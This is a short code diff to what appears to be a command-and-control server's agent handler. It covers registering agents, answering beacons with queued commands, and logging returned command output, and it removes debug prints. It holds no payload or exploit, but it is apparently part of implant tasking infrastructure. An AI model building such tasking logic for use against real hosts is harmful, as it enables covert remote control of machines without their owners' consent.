@@ -15,25 +15,23 @@ def process_agent(data, dictionary):
 
     if identifier == 'register':
         key = register(data, dictionary)
-        print(dictionary)
         return key
     else:
         for key in dictionary:
-            print(identifier)
-            print(dictionary[key]['key'])
             if str(identifier) == str(dictionary[key]['key']):
                 if str(data) == "beacon":
                     print(settings.command_queue_table)
                     for x, y in settings.command_queue_table.items():
-                        print("hello")
                         print(x, y)
                         if x == dictionary[key]['id']:
                             if len(y) > 0:
-                                command_patch = patch.convert_command_to_patch(
-                                    y)
+                                command_patch = patch.convert_command_to_patch(y)
                                 del settings.command_queue_table[x]
                                 return command_patch
                     pass
                 else:
                     pass
-                return "This is a command"
+            elif str(identifier) == "output": # Note technically this can have some opsec concerns I should probably clean auth up 
+                print("Command output received: ", data)
+
+        return "roger"
